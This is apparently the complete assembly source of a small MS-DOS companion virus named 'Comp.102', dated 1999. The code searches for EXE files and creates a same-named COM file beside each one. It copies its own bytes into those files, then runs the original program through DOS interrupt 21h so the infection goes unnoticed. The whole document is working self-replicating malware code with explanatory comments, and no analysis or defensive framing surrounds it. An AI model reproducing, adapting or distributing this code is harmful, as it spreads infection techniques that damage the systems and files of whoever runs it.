   ;Comp.102 (c) 1999 by CrkV

   Model Tiny
   .code
   .386
       Org 100h
   Comp:
       db  '*.EXE'     ;Sub Ch,[Adr], Inc Bp (also *.E*)

   Param   dw  00h     ;CmdLine for function 4Bh Int 21h
       dw  80h
       db  00h
       Xchg    Cx,Ax       ;Cx:=0

       Mov Bh,10h      ;Bl=00h
       Mov Dx,Bx       ;Dx:=1000h (New DTA)

       Mov Ah,1Ah
       Int 21h     ;Set DTA

       Mov Ah,4Ah
       Int 21h     ;Set Memory Block (Es=PSP, Bx=1000h)

       Mov Ah,4Eh      ;Find First File

   @FindFile:
   @WriteFile:
       Mov Di,101Eh
       Mov Dx,Si       ;Dx:=100h
       Int 21h     ;Find File (Write File)
       Jnc @Ok
   @Exit:
       Mov Ax,1203h
       Int 2Fh     ;Ds:= Dos Segment

       LEs Di,Ds:[Bp-1Bh]  ;Es:Di - Cmd Line
       Mov Dx,Di
       Mov Al,'.'
       Dec Cx      ;Cx:=0FFFFh
       Repne   ScaSB
       Push    Cs Es
       Pop Ds Es
       Mov DWord Ptr [Di],'EXE'
       Mov Ax,4B00h
       Mov Bx,Offset Param
       Mov Es:[Bx+4],Cs
       Int 21h     ;Exec (Ax=4B00h)
       Ret

   @OK:    Mov Dx,Di
       Mov Ax,5B2Eh

   @Loop:  ScaSB           ;Al='.'
       Jne @Loop
       Mov DWord Ptr [Di],006D6F63h    ;'com',00h

       Int 21h     ;Ah=5Bh (Create File)
       Xchg    Bx,Ax       ;Bx:= File handle

       Mov Ah,4Fh      ;Find Next File
       Jc  @FindFile
       Mov Ah,40h      ;Write File
       Mov Cl,VirLength    ;Ch=0
       Jmp Short @WriteFile

   VirLength   EQU $ - Comp
       End Comp
